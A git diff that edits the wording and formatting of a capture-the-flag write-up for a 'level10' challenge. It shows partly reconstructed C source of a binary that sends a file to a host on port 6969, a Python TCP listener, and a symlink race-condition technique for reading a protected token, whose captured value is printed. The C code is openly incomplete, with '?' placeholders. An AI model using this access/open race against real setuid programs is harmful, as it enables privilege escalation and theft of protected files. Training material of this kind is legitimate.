@@ -152,8 +152,7 @@ Dump of assembler code for function main:
 ```
 
 ```c
-int main (int ac, char **av)
-{
+int main(int ac, char **av) {
     if (ac != 3) {
         printf("%s file host\n\tsends file to host if you have access to it", av[0]);
         exit(1);
@@ -163,28 +162,29 @@ int main (int ac, char **av)
         fflush(stdout);
         socket(2, 1, 0);
         inet_addr(av[2]);
-        htons(6969)
+        htons(6969);
         if (connect(7, ?, 10) == -1) {
             printf(?);
             exit(1);
         }
-        if (write(?, ".*( )*.\n, 7") == -1) {
-            printf("Unable to write banner to host %s\n", av[2])
+        if (write(?, ".*( )*.\n", 7) == -1) {
+            printf("Unable to write banner to host %s\n", av[2]);
             exit(1);
         }
         printf("Connected!\nSending file ..");
-        int fd = open(av[1]);
-        read(fd, buf, 52);
-        write(?, buf, 52)
+        int fd = open(av[1], 0);
+        char buf[1024];
+        read(fd, buf, 1024);
+        write(7, buf, 1024);
     }
 }
 ```
 
-This is a incomplete version of the source code of `level10` executable. It's imcomplete but we can understand what this level10 does and how to get the content of `token`.
+This is an incomplete version of the source code of the `level10` executable. It's incomplete, but we can understand what this `level10` does and how to get the content of the `token`.
 
-In this level we have two functions `access` and `open` with some heavy operations between them. So I will use a race condition vulnerability. This technique involves of creating a symlink and rapidly change the link between the token and a accessible file.
+In this level, we have two functions `access` and `open` with some heavy operations between them. So, I will use a race condition vulnerability. This technique involves creating a symlink and rapidly changing the link between the token and an accessible file.
 
-But first we need to run a server TCP on the `6969` port. So I searched a python server on internet.
+But first, we need to run a TCP server on port `6969`. So, I searched for a Python server on the internet.
 
 ```python
 import socket
@@ -199,15 +199,15 @@ s.listen(1)
 conn, addr = s.accept()
 print("Connected by {addr}")
 while True:
-        data = conn.recv(1024)
-        print(data)
-        if not data:
-                conn.close()
-                break
-        conn.sendall(data)
+    data = conn.recv(1024)
+    print(data)
+    if not data:
+        conn.close()
+        break
+    conn.sendall(data)
 ```
 
-Now I just have to create the race condition script, run the server then run the executable.
+Now, I just have to create the race condition script, run the server, and then run the executable.
 
 ```shell
 $ echo "empty" > /tmp/empty
@@ -222,7 +222,7 @@ woupa2yuojeeaaed06riuj63c
 
 ---
 
-*Source :*
+*Source:*
 
 *https://www.automox.com/blog/vulnerability-definition-race-condition#*
 
